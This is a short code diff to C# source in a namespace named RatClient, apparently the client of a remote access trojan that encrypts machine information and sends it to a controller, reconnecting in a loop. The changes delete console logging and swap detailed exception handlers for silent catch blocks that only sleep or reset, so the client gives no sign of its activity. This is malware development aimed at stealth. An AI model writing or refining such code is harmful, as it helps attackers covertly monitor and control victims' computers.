@@ -45,7 +45,6 @@ namespace RatClient
         {
             byte[] data = ACRSA.Encrypt(SerializeToJson(new ClientInfo()), PublicKey);   
             client.GetStream().Write(data, 0, data.Length);
-            Console.WriteLine("end Sending");
         }
 
         private void SendMsg(byte[] msg)
@@ -84,10 +83,7 @@ namespace RatClient
                     Console.WriteLine("Completed!");
                     return;
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine($"{ex.Message}");
-                }
+                catch 
                 {
                     Thread.Sleep(3000);
                 }
@@ -129,9 +125,8 @@ namespace RatClient
                         client.GetStream().Write(randomBytes, 0, randomBytes.Length);
                     }
                 }
-                catch (Exception e)
+                catch 
                 {
-                    Console.WriteLine(e);
                     Resetor();
                 }
                 Thread.Sleep(1000);
